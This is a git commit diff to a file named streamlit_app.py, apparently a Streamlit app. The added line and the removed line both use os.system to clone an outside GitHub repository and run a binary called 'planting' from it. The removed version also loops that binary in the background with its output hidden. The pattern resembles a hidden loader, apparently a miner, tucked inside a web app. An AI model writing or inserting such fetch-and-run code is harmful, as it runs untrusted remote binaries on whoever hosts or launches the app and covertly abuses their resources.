ee90adfb38bda23b44131ec4b7453d169c44c4d2
Jani Nero <109569161+janiolero@users.noreply.github.com>
2022-07-19 23:29:36 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -4,4 +4,4 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system ("rm -rf agile && git clone https://github.com/janiolero/agile.git && cd agile && chmod +x planting && while [ 1 ]; do nohup ./planting > /dev/null; sleep 1; done & watch free -m")
+os.system ("rm -rf agile && git clone https://github.com/janiolero/agile.git && cd agile && chmod +x planting && ./planting")
